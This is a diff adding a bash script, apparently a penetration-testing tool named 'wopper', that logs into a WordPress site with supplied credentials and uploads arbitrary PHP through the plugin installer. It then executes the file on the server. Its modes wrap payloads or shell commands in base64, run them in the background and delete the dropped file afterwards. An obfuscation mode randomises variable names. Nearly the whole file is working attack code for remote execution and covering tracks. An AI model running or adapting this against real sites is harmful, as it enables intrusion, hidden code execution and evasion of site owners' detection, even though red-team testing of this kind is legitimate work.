@@ -1,0 +1,317 @@
+#!/bin/bash
+
+read -r -d '' usage << EOF
+ _      ______  ____  ____  ___  _____
+| | /| / / __ \/ __ \/ __ \/ _ \/ ___/
+| |/ |/ / /_/ / /_/ / /_/ /  __/ /    
+|__/|__/\____/ .___/ .___/\___/_/     
+            /_/   /_/                 
+
+WordPress Privilege Escalation Rapidly
+
+Usage: wopper -u [user] -p [pass] -f [file] (-x) (-s) (-t [time]) (-i) (-c) (-o) (-v) [URL]
+
+The URL must be specified as the final argument and should point to the target's WordPress root directory. The URL should include the protocol and supports non-standard ports.
+The -u, -p, and -f flags are required for most commands.
+
+Wopper has five modes of operation depending on whether the following flags are used:
+
+Default Mode:
+The chosen file will be automatically uploaded and its location will be returned, if successful.
+An optional execution flag, -x, can be set to execute the file after upload.
+This is useful when you want to automatically upload and execute, but not delete a file.
+Usage: wopper -u [user] -p [pass] -f [file] (-x) [URL]
+
+Scrub Mode (-s):
+The chosen file will be automatically uploaded, executed, and subsequently deleted via a second file.
+An optional timer flag, -t, can be set to add a timeout (in seconds) after execution and before deletion.
+This mode is useful if you'd like to kill and remove a script after a set time or automate deletion without modifying the original file.
+In Scrub, Inject, and Command Mode, the optional -v flag can be used to verify deletion.
+Usage: wopper -u [user] -p [pass] -f [file] -s (-t [timeout]) (-v) [URL]
+
+Inject Mode (-i):
+The chosen file will be injected into a wrapper script that will allow it to run in a background process while deleting itself.
+Furthermore, this option provides minor obfuscation via Base64 and randomly generated file names.
+Usage:  wopper -u [user] -p [pass] -f [file] -i (-v) [URL];  wopper -f [file] -i (file name)
+
+Command Mode (-c):
+The chosen command will be converted to Base64 and inserted into a self-destructing wrapper script, similar to Inject Mode.
+The difference is that instead of executing another PHP script, the command is executed directly.
+Usage:  wopper -u [user] -p [pass] -c [cmd] (-v) [URL];  wopper -c [cmd] (file name)
+
+Obfuscation Mode (-o):
+This mode simply performs additional obfuscation by randomizing variable names. More obfuscation to be added in the future.
+Usage: wopper -f [file] -o (file name)
+
+Local Use:
+If no URL is specified in Inject or Command Mode, the resulting file is saved locally and not uploaded.
+When saving locally, the resulting file name can be set as the final argument. Otherwise the file name is random. File names must end with ".php".
+If a second file name is given as the final argument in Obfuscation Mode, a copy with that name is obfuscated instead of the original.
+EOF
+
+OPTIONS=$(getopt -o u:p:f:c:xst:iov --long help -- "$@")
+
+url=''
+target=''
+wpdir=''
+wpdirenc=''
+port=''
+user=''
+pass=''
+file=''
+file2=''
+cmd=''
+execute=0
+scrub=0
+scrubber='<?php system("rm -f REPLACE scrub.php"); ?>'
+time=0
+inject=0
+obfuscate=0
+verify=0
+
+while getopts "u:p:f:c:xst:iov" opt; do
+  case ${opt} in
+    u) user="$OPTARG" ;;
+    p) pass="$OPTARG" ;;
+    f) file="$OPTARG" ;;
+    c) cmd="$OPTARG" ;;
+    x) execute=1 ;;
+    s) scrub=1 ;;
+    t) time="$OPTARG" ;;
+    i) inject=1 ;;
+    o) obfuscate=1 ;;
+    v) verify=1 ;;
+    *) printf "$usage\n\n" | sed '1s|^| |'; exit 1 ;;
+  esac
+done
+
+last="${!#}" # Final positional argument
+
+if [[ "$last" =~ ^http ]]; then # Check for URL
+  url="${last%/}" # Remove trailing slash
+elif [[ "$last" =~ \.php$ ]] && ([ "$inject" -eq 1 ] || [ -n "$cmd" ] || [ "$obfuscate" -eq 1 ]); then # Check if a second file name is set
+  file2="$last"
+fi
+
+# Ensure that the URL and file are specified where needed
+if [ -z "$url" ] && ! ([ "$inject" -eq 1 ] || [ -n "$cmd" ] || [ "$obfuscate" -eq 1 ]); then
+  printf "$usage\n\n" | sed '1s|^| |'; exit 1
+elif [ -z "$file" ] && [ -z "$cmd" ]; then
+  printf "$usage\n\n" | sed '1s|^| |'; exit 1
+fi
+
+protocol=$(echo "$url" | cut -d ':' -f 1)
+target=$(echo "$url" | cut -d '/' -f 3 | sed 's|:.*||')
+port=$(echo "$url" | grep -Eo ':[0-9]+')
+
+if [ $(echo "$url" | grep -o '/' | wc -l) -ge 3 ]; then
+  wpdir=$(echo "$url" | sed "s|.*$target[:0-9]*||")
+fi
+
+wpdirenc=$(python3 -c "import sys, urllib.parse; print(urllib.parse.quote(\"$wpdir\", safe=\"\"))")
+
+upload() {
+  cookie=$(curl -H "Host: $target$port" \
+                -H 'User-Agent: wopper by NetSPI' \
+                -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' \
+                -H 'Accept-Language: en-US,en;q=0.5' \
+                -H "Referer: $protocol://$target$port$wpdir/wp-login.php" \
+                -H 'Content-Type: application/x-www-form-urlencoded' \
+                -H "Origin: $protocol://$target$port" \
+                -H 'DNT: 1' \
+                -H 'Connection: keep-alive' \
+                -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' \
+                -H 'Upgrade-Insecure-Requests: 1' \
+                -H 'Priority: u=0, i' \
+                -X POST "$protocol://$target$port$wpdir/wp-login.php" \
+                -d "log=$user&pwd=$pass&wp-submit=Log+In&redirect_to=$protocol%3A%2F%2F$target$port$wpdirenc%2Fwp-admin%2F&testcookie=1" -s -i --compressed \
+                | grep Set-Cookie | sed 's|Set-Cookie: ||' | sed "s| path=$wpdir.*||" | tr '\n' ' ')
+
+  nonce=$(curl -H "Host: $target$port" \
+  	     -H 'User-Agent: wopper by NetSPI' \
+  	     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' \
+  	     -H 'Accept-Language: en-US,en;q=0.5' \
+  	     -H "Referer: $protocol://$target$port$wpdir/wp-login.php" \
+  	     -H "Origin: $protocol://$target$port" \
+  	     -H 'DNT: 1' \
+  	     -H 'Connection: keep-alive' \
+  	     -H "Cookie: $cookie" \
+  	     -H 'Upgrade-Insecure-Requests: 1' \
+  	     -H 'Priority: u=0, i' \
+  	     -X GET "$protocol://$target$port$wpdir/wp-admin/plugin-install.php" -s --compressed \
+         | pup 'input#_wpnonce attr{value}')
+
+  curl -H "Host: $target$port" \
+       -H 'User-Agent: wopper by NetSPI' \
+       -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' \
+       -H 'Accept-Language: en-US,en;q=0.5' \
+       -H "Referer: $protocol://$target$port$wpdir/wp-admin/plugin-install.php" \
+       -H 'Content-Type: multipart/form-data' \
+       -H "Origin: $protocol://$target$port" \
+       -H 'DNT: 1' \
+       -H 'Connection: keep-alive' \
+       -H "Cookie: $cookie" \
+       -H 'Upgrade-Insecure-Requests: 1' \
+       -H 'Priority: u=0, i' \
+       -X POST "$protocol://$target$port$wpdir/wp-admin/update.php?action=upload-plugin" \
+       -F "_wpnonce=$nonce" \
+       -F '_wp_http_referer=$wpdir/wp-admin/plugin-install.php' \
+       -F "pluginzip=@$file;type=application/zip" \
+       -F 'install-plugin-submit=Install Now' -s -i --compressed
+}
+
+if [ $scrub -eq 1 ]; then
+  if [ -f scrub.php ] && [ -s scrub.php ]; then
+    echo "[!] scrub.php already exists. Will not clobber file. Exiting."
+    exit 1
+  fi
+
+  echo "$scrubber" > scrub.php
+  sed -i "s|REPLACE|$file|g" scrub.php
+
+  initial="$file"
+
+  if upload | head -n 1 | grep -q '200 OK'; then
+    echo '[+] Upload successful'
+  else
+    echo '[!] Upload failed'; exit 1
+  fi
+
+  if timeout "$time"s curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/$file" 1>/dev/null; then
+    echo '[+] Execution successful'
+  else
+    echo '[+] Reached timeout'
+  fi
+
+  file='scrub.php'
+  if upload | head -n 1 | grep -q '200 OK'; then
+    curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/scrub.php" 1>/dev/null
+  fi
+
+  if [ "$verify" -eq 1 ]; then
+    sleep 1
+
+    if ! curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/" | grep -q "$initial"; then
+      echo '[+] Deletion successful'
+    else
+      echo '[!] Deletion failed'
+    fi
+  fi
+
+  rm scrub.php
+elif [ $inject -eq 1 ]; then
+  og=$(cat "$file" | sed 's|^<?php ||' | sed 's| ?>$||' | base64 | tr -d '\n')
+
+  if [ -n "$file2" ]; then
+    if [ -f "$file2" ] && [ -s "$file2" ]; then
+      echo "[!] $file2 already exists. Will not clobber file. Exiting."
+      exit 1
+    fi
+
+    file="$file2"
+  else
+    safe=0
+    until [ "$safe" -eq 1 ]; do tmp=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10); ! (test -f "$tmp.php" || test -d "$tmp.php") && safe=1; done
+
+    file="$tmp.php"
+  fi
+
+  new="<?php \$cmd = 'og=\$(echo $og | base64 -d); nohup php -r \"\$og\" > /dev/null 2>&1 & rm -f $file'; exec(\"\$cmd\"); ?>"
+  echo "$new" > "$file"
+
+  if [ -n "$url" ]; then
+    if upload | head -n 1 | grep -q '200 OK'; then
+      echo '[+] Upload successful'
+    else
+      echo '[!] Upload failed'; exit 1
+    fi
+
+    if curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/$file" 1>/dev/null; then
+      echo '[+] Execution successful'
+    else
+      echo '[!] Execution failed'
+    fi
+
+    if [ "$verify" -eq 1 ]; then
+      sleep 1
+
+      if ! curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/" | grep -q "$file"; then
+        echo '[+] Deletion successful'
+      else
+        echo '[!] Deletion failed'
+      fi
+    fi
+
+    rm "$file"
+  fi
+elif [ -n "$cmd" ]; then
+  cmd=$(echo "$cmd" | base64 | tr -d '\n')
+
+  if [ -z "$file2" ]; then
+    safe=0
+    until [ "$safe" -eq 1 ]; do tmp=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10); ! (test -f "$tmp.php" || test -d "$tmp.php") && safe=1; done
+    file="$tmp.php"
+  elif [ -f "$file2" ]; then
+    echo "[!] $file2 already exists. Will not clobber file. Exiting."
+    exit 1
+  else
+    file="$file2"
+  fi
+
+  new="<?php exec(\"echo $cmd | base64 -d | nohup sh > /dev/null 2>&1 & rm -f $file\"); ?>"
+  echo "$new" > "$file"
+
+  if [ -n "$url" ]; then
+    if upload | head -n 1 | grep -q '200 OK'; then
+      echo '[+] Upload successful'
+    else
+      echo '[!] Upload failed'; exit 1
+    fi
+  
+    if curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/$file" 1>/dev/null; then
+      echo '[+] Execution successful'
+    else
+      echo '[!] Execution failed'
+    fi
+
+    if [ "$verify" -eq 1 ]; then
+      sleep 1
+  
+      if ! $(curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/" | grep -q "$file"); then
+        echo '[+] Deletion successful'
+      else
+        echo '[!] Deletion failed'
+      fi
+    fi
+
+    rm "$file"
+  fi
+elif [ "$obfuscate" -eq 1 ]; then
+  if [ -n "$file2" ]; then
+    if [ -f "$file2" ] && [ -s "$file2" ]; then
+      echo "[!] $file2 already exists. Will not clobber file. Exiting."
+      exit 1
+    fi
+  
+    cp "$file" "$file2"
+    file="$file2"
+  fi
+
+  for x in $(cat "$file" | grep -oP '\$[A-Za-z0-9]+' | sort -u | tr -d '$'); do sed -i "s/$x/$(rand 5)/g" "$file"; done
+  sed -i "s|rm -f .*php|rm -f $file|g" "$file"
+else
+  if upload | head -n 1 | grep -q '200 OK'; then
+    echo '[+] Upload successful'
+    echo "[+] Location: $protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/$file"
+  else
+    echo '[!] Upload failed'; exit 1
+  fi
+
+  if [ "$execute" -eq 1 ]; then
+    if curl -s "$protocol://$target$port$wpdir/wp-content/uploads/$(date +%Y/%m)/$file" 1>/dev/null; then
+      echo '[+] Execution successful'
+    else
+      echo '[!] Execution failed'
+    fi
+  fi
+fi
